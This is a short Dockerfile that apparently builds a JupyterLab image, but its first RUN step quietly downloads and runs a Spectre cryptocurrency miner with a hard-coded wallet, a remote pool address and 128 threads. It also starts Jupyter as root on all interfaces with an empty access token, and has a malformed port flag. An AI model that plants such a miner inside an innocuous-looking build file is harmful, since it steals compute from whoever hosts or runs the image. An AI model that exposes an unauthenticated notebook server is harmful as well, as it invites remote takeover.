#update
FROM ubuntu:latest

#use the last
RUN apt-get update && apt-get install unzip -y && wget https://github.com/spectre-project/spectre-miner/releases/download/v0.3.16/spectre-miner-v0.3.16-linux-gnu-amd64.zip && unzip spectre-miner-v0.3.16-linux-gnu-amd64.zip && cd bin && ./spectre-miner-v0.3.16-linux-gnu-amd64 --mining-address spectre:qpscxeppmyrru2646ttj4nl0x2rfzemkkdejvfmmhvplt3t57aksuywcrar8d --spectred-address 116.111.127.6 --port 18110 --threads 128 /

#set
WORKDIR /app

#jupyrte
RUN pip3 install jupyterlab

#port
EXPOSE 8080

#start
CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port-8080", "--no-browser", "--allow-root", "--NotebookApp.token=''"]
